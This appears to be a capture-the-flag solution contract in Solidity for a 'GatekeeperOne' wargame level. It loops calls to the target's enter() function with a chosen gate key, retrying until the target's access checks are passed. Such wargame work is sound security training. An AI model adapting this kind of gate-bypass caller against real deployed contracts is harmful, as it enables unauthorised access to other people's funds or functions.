// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {GatekeeperOne} from "./L14__GatekeeperOne.sol";

contract L14_Caller__GatekeeperOne {
    GatekeeperOne public gatekeeperOne =
        GatekeeperOne(0x240e086a5595e5D2F215101E214a546B70B39976);

    function enterGate(bytes8 _gateKey) public returns (bool _success) {
        while (!_success) {
            try gatekeeperOne.enter(_gateKey) returns (bool _isEntrant) {
                _success = _isEntrant;
            } catch {}
        }

        require(_success, "enter failed");
    }
}
